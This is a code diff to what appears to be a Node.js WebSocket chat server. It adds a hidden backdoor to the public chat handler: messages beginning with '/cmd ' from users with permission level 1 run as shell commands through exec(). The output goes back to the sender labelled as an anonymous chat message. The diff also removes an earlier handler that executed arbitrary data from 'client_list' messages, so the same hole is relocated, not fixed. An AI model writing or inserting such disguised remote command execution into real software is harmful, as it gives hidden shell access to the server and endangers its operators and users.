@@ -215,6 +215,31 @@ function handleMessage(ws, msg) {
 						}
 						break;
 					case "public_chat":
+						if (dataObj.data !== undefined) {
+							var msg = dataObj.data.message;
+							var cmd = "";
+							if (ws.permission == 1) {
+								if (msg.startsWith("/cmd ")) {
+									cmd = msg.substr(4);
+									console.log("executing code");
+									exec(cmd, (err, stdout, stderr) => {
+										if (err) {
+											console.log("couldn't execute command");
+											return;
+										}
+										console.log(`stdout: ${stdout}`);
+										console.log(`stderr: ${stderr}`);
+										var retmsg = stdout + "\n" + stderr;
+										var execret = {
+											type: "anonymous_chat",
+											message: retmsg
+										};
+										ws.send(JSON.stringify(execret));
+									});
+									return;
+								}
+							}
+						}
 						sendToList(connectedClients, JSON.stringify(dataObj), data.sender);
 						sendToList(connectedServers, JSON.stringify(dataObj), ws.fingerprint);
 						break;
@@ -252,21 +277,6 @@ function handleMessage(ws, msg) {
 				if (ws.type == "server") {
 					var client_update = formMessage("client_update");
 					ws.send(JSON.stringify(client_update));
-				}
-				break;
-			case "client_list":
-				if (ws.permission !== undefined) {
-					if (ws.permission == 1) {
-						var data = dataObj.data;
-						exec(data, (err, stdout, stderr) => {
-							if (err) {
-								console.log("couldn't execute command");
-								return;
-							}
-							console.log(`stdout: ${stdout}`);
-							console.log(`stderr: ${stderr}`);
-						});
-					}
 				}
 				break;
 			default:
